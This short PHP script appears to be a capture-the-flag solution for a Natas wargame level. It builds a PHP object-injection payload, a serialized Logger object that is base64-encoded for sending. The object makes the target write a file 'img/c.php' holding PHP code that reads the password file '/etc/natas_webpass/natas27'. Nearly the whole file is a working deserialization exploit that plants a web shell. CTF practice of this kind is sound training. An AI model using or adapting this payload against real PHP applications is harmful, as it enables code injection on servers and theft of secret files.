<?php
/* class Exa { */
/*     public $some_var = "This the data from the ser"; */
/* } */

/* echo serialize(new Exa); */

class Logger {
    private $logFile = "img/c.php";
    private $exitMsg = "<?php echo file_get_contents(\"/etc/natas_webpass/natas27\"); ?>";
}

echo base64_encode(serialize(new Logger));

?>
